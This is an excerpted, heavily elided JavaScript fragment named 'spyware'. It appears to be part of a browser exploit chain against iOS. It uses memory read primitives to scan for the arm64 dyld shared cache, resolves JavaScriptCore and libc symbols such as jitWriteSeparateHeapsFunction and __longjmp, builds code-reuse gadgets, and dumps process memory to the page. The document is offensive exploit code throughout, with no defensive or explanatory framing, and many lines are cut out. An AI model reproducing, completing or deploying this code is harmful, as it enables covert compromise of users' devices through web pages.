...
(function() {
    ...
    window.spyware = function(q, f, m) {
        var F =
            ...
            U = f.readInt64(J);
        f.u32 = h;
        for (var n = f.readInt64(U), r = Sub(n, n.lo() & 4095); !e(f.read(r, 16), "dyld_v1   arm64");) r = Sub(r, 4096);
        var x = null,
            G = f.u32(Add(r, 20)),
        ...
        for (var l = 0; l < G; ++l) {
            ...
            n.push(g);
            0 != g.fileoff.hi() || 0 !=
                g.fileoff.lo() || 0 == g.size.hi() && 0 == g.size.lo() || (x = g)
        }
        ...
        } else M["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push("__ZN3JSC29jitWriteSeparateHeapsFunctionE"), C = {
        ...
        for (l = 0; l < u.length; ++l) n = u[l], null == x[n] && fail(n), x[n] = Add(x[n], G);
        u = Object.keys(C);
        for (l = 0; l < u.length; ++l) n =
            u[l], null == D[n] && fail(n);
        G = x.__longjmp;
        var S = D.regloader,
            N = D.dispatch,
        ...
        for (g = 0; g < l.length; g++) {
            ...
            if ("dump_el_obj" ==
                ...
                F *= 8;
                z = "";
                for (J = 0; J < F; J += 8) z += hexlify(f.readInt64(Add(P, J)).bytes) + "\n";
                document.write(z);
